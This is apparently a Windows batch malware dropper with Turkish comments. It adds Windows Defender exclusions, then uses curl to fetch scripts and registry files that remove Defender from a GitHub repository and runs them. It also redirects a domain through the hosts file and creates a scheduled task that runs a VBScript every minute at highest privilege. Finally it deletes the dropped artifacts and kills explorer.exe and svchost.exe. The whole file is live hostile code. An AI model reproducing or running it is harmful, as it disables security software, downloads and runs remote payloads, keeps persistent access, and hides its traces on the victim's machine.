@echo on
setlocal EnableDelayedExpansion

echo [*] Starting debug mode script execution...

REM ======= Defender Hariç Tutmalar =======
echo [*] Adding Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\DefenderRemover.bat'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\e.vbs'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_SecurityComp'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender'"

REM ======= Taskları Sil =======
echo [*] Deleting existing scheduled tasks...
schtasks /delete /tn "upgradef1" /f
schtasks /delete /tn "InstallRequests" /f
schtasks /delete /tn "RunPowerShellScript" /f

REM ======= Klasör Oluştur =======
cd %temp%
echo [*] Creating working directories...
mkdir Remove_SecurityComp
mkdir Remove_Defender

REM ======= Dosyaları İndir =======
echo [*] Downloading reg and script files...
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Remove_SecurityComp.reg -o "Remove_SecurityComp\Remove_SecurityComp.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NomoreDelayandTimeouts.reg -o "Remove_Defender\NomoreDelayandTimeouts.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/Output.reg -o "Remove_Defender\Output.reg"
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RemoveShellAssociation.reg -o "Remove_Defender\RemoveShellAssociation.reg"

curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/DefenderRemover.bat -o DefenderRemover.bat
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/RunDefenderRemover.vbs -o RunDefenderRemover.vbs
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs -o e.vbs
curl -L https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat

REM ======= Host Dosyasına Domain Ekle =======
echo [*] Editing hosts file...
echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts

REM ======= Ana Scriptleri Çalıştır =======
echo [*] Running DefenderRemover.bat...
if exist DefenderRemover.bat (
    call DefenderRemover.bat
) else (
    echo [!] DefenderRemover.bat not found!
)

echo [*] Running RunDefenderRemover.vbs...
if exist RunDefenderRemover.vbs (
    cscript //nologo RunDefenderRemover.vbs
) else (
    echo [!] RunDefenderRemover.vbs not found!
)

REM ======= Yeni Task Oluştur (Persistence) =======
echo [*] Creating persistent task with e.vbs...
if exist e.vbs (
    schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1 /f /rl HIGHEST
) else (
    echo [!] e.vbs not found!
)

REM ======= Temizlik İşlemleri =======
echo [*] Cleaning up temporary files...
timeout /t 5

cd %temp%
del /f /q "s.bat" "a.py" "ddd.vbs" "expe2.bat" "expe2.vbs" "lalala.vbs" "a.ps1" "first.exe" "corpvpn.inf"
del /f /q "RunDefenderRemover.vbs" "DefenderRemover.bat"
rmdir /s /q "Remove_SecurityComp"
rmdir /s /q "Remove_Defender"

REM ======= Sistem Yeniden Başlat (Daha Güvenli) =======
echo [*] Restarting system in 10 seconds...
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe

REM Güvenli kapanış

